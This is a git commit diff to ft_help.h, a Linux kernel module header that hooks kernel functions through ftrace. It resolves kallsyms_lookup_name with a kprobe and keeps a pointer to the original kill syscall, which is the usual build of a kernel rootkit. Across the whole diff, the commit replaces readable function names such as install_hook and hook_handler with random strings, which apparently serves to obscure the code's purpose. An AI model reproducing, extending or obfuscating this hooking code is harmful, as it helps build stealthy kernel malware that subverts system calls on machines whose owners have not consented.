5556d63fe07527769550e3cf795000a68d981dd5
Shivom <32161179+shv-om@users.noreply.github.com>
2025-04-17 13:55:05 +0530

    Update ft_help.h

--- ft_help.h
+++ ft_help.h
@@ -16,7 +16,6 @@
 #define SYSCALL_NAME(name) (name)
 #endif
 
-// Hook Structure
 struct ftrace_hook {
     const char *name;
     void *function;
@@ -32,17 +31,17 @@ struct ftrace_hook {
     .original = (_orig), \
 }
 
-unsigned long lookup_name(const char *name);
-int install_hook(struct ftrace_hook *hook);
-void remove_hook(struct ftrace_hook *hook);
+unsigned long hsjeushdns(const char *name);
+int uejshdnskd(struct ftrace_hook *hook);
+void jdhenshdks(struct ftrace_hook *hook);
 
-asmlinkage void hook_handler(unsigned long ip, unsigned long parent_ip,
+asmlinkage void uehdnshans(unsigned long ip, unsigned long parent_ip,
                              struct ftrace_ops *ops, struct ftrace_regs *regs);
 
 unsigned long (*real_kallsyms_lookup_name)(const char *name);
 static asmlinkage int (*orig_kill)(const struct pt_regs *);
 
-unsigned long lookup_name(const char *name) {
+unsigned long hsjeushdns(const char *name) {
     if (!real_kallsyms_lookup_name) {
         struct kprobe kp = {.symbol_name = "kallsyms_lookup_name"};
 
@@ -55,9 +54,9 @@ unsigned long lookup_name(const char *name) {
     return real_kallsyms_lookup_name ? real_kallsyms_lookup_name(name) : 0;
 }
 
-int install_hook(struct ftrace_hook *hook) {
+int uejshdnskd(struct ftrace_hook *hook) {
     int err;
-    hook->address = lookup_name(hook->name);
+    hook->address = hsjeushdns(hook->name);
 
     if (!hook->address) {
         return -ENOENT;
@@ -66,7 +65,7 @@ int install_hook(struct ftrace_hook *hook) {
     *((unsigned long *)hook->original) = hook->address;
     printk(KERN_DEBUG "mob: Hooking %s at address: %px with handler %px\n", hook->name, (void *)hook->address, hook->function);
 
-    hook->ops.func = (ftrace_func_t)hook_handler;
+    hook->ops.func = (ftrace_func_t)uehdnshans;
     hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;
 
     err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
@@ -82,7 +81,7 @@ int install_hook(struct ftrace_hook *hook) {
     return 0;
 }
 
-void remove_hook(struct ftrace_hook *hook) {
+void jdhenshdks(struct ftrace_hook *hook) {
     int err = unregister_ftrace_function(&hook->ops);
     if (err) {
     }
@@ -94,7 +93,7 @@ void remove_hook(struct ftrace_hook *hook) {
     }
 }
 
-asmlinkage void hook_handler(unsigned long ip, unsigned long parent_ip,
+asmlinkage void uehdnshans(unsigned long ip, unsigned long parent_ip,
                              struct ftrace_ops *ops, struct ftrace_regs *regs) {
     struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
 
@@ -110,6 +109,7 @@ asmlinkage void hook_handler(unsigned long ip, unsigned long parent_ip,
         if (!within_module(parent_ip, THIS_MODULE)) {
             instruction_pointer_set(pt_regs, (unsigned long)hook->function);
         } else {
+            printk(KERN_DEBUG "mob: Prevented direct recursion via parent_ip check\n");
             return;
         }
     #endif
